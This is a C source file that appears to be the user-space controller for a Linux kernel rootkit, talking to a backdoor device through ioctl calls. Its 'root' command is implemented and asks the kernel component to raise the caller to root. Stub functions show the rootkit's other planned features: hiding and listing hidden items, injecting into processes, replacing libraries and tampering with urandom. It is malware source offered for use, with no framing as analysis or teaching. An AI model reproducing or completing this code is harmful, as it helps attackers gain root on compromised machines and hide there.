#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include "bdoor_common.h"

#define ROOT_CMD "root"
#define URAND_CMD "urand"
#define HIDE_CMD "hide"
#define SHOW_CMD "show"
#define LIST_HIDDEN_CMD "list"
#define INJECT_CMD "inject"
#define REPLACE_CMD "replace"

static int backdoor_fd;

static int open_device(void)
{
	backdoor_fd = open(BDOOR_DEV_PATH,O_RDONLY);
	printf("file descriptor:%d\n",backdoor_fd);
	if (backdoor_fd == -1)
		return -1;
	return 0;
}

static void close_device(void)
{
	close(backdoor_fd);
}

static int make_root(int argc, char **argv)
{
	int res;
	int ret;
	printf("uid before ioctl:%lu\n",getuid());
	res = ioctl(backdoor_fd,ROOT_IOCTL,NULL);
	printf("uid after ioctl:%lu\n",getuid());
	if (res == 0) {
		printf("successfully rooted user\n");
		ret = 0;
	} else {
		perror("ERROR ROOTING USER");
		ret = EXIT_FAILURE;
	}
	return ret;
}

static int toggle_urandom(int argc, char **argv)
{
	printf("not yet implemented\n");
	return 0;
}

static int hide_item(int argc, char **argv)
{
	printf("not yet implemented\n");
	return 0;
}

static int show_item(int argc, char **argv)
{
	printf("not yet implemented\n");
	return 0;
}

static int list_hidden_items(int argc, char **argv)
{
	printf("not yet implemented\n");
	return 0;
}

static int inject_pid(int argc, char **argv)
{
	printf("not yet implemented\n");
	return 0;
}

static int replace_libs(int argc, char **argv)
{
	printf("not yet implemented\n");
	return 0;
}


static int get_first_arg(int argc, char **argv)
{
	if (!strncmp(argv[1],ROOT_CMD,strlen(ROOT_CMD))) {
		return make_root(argc,argv);
	} else if (!strncmp(argv[1],URAND_CMD,strlen(URAND_CMD))) {
		return toggle_urandom(argc,argv);
	} else if (!strncmp(argv[1],HIDE_CMD,strlen(HIDE_CMD))) {
		return hide_item(argc,argv);
	} else if (!strncmp(argv[1],SHOW_CMD,strlen(SHOW_CMD))) {
                return show_item(argc,argv);
	} else if (!strncmp(argv[1],LIST_HIDDEN_CMD,strlen(LIST_HIDDEN_CMD))) {
                return list_hidden_items(argc,argv);
	} else if (!strncmp(argv[1],INJECT_CMD,strlen(INJECT_CMD))) {
                return inject_pid(argc,argv);
	} else if (!strncmp(argv[1],REPLACE_CMD,strlen(REPLACE_CMD))) {
                return replace_libs(argc,argv);
	} else {
		printf("ERROR: invalid command\n");
		return EXIT_FAILURE;
	}
}

int main(int argc, char **argv)
{
	int ret = 0;
	if (open_device() == -1) {
		printf("ERROR: backend device not registered\n");
		ret = EXIT_FAILURE;
		goto out;
	}
	if (argc <= 1) {
		printf("ERROR: need at least one argument\n");
		ret = EXIT_FAILURE;
	} else {
		ret = get_first_arg(argc,argv);
	}
	close_device();
out:
	return ret;
}
